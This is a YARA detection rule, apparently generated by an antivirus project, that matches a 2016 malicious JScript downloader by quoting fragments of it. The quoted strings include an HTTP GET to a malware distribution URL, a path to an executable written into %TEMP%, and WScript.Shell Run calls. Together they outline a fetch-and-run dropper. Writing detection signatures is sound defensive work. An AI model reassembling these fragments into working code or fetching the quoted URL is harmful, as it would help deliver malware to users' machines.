rule sig_20160329_ffe2448269721a9a74d85f14e2aa7a50 {
  meta:
    description = "datamaliciousorder - file 20160329_ffe2448269721a9a74d85f14e2aa7a50.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "18c640a73e6a30b1acc1639d6a464a390ce51bcd0d6093a39859c285cb15f661"

  strings:
    $s1  = "Pa[U](\"GET\", \"http://blog.saletron.net/li9soz\", false);" fullword ascii
    $s2  = "function t() {return P[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"jaaIusWE4Y.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[nH](AZ() * 11); if (Pa[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function Hx(RO, h){p = p * 1; return RO - h;};" fullword ascii
    $s5  = "var P = function b() {return WScript[a](\"WScript.Shell\");}(), UO = 11;" fullword ascii
    $s6  = "function uI(){return \"\" + d0;};" fullword ascii
    $s7  = "function d(kh){P[\"Run\"](kh, p, p);};" fullword ascii
    $s8  = "function Z() {return ((az == true) && (az == FF)) ? 1 : p;};" fullword ascii
    $s9  = " while (F){" fullword ascii
    $s10 = "var QR = new this[\"Date\"]();" fullword ascii
    $s11 = "function D(u) {var v = (1, 2, 3, 4, 5, u); return v;};" fullword ascii
    $s12 = "function AZ(){return 22;};" fullword ascii
    $s13 = "function rk()" fullword ascii
    $s14 = "return Hx(X0, I);" fullword ascii
    $s15 = "function N(){return a;};" fullword ascii
    $s16 = "var v0 = false;" fullword ascii
    $s17 = "az = true; " fullword ascii
    $s18 = "var FF = false;" fullword ascii
    $s19 = "var az = false;" fullword ascii
    $s20 = "FF = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}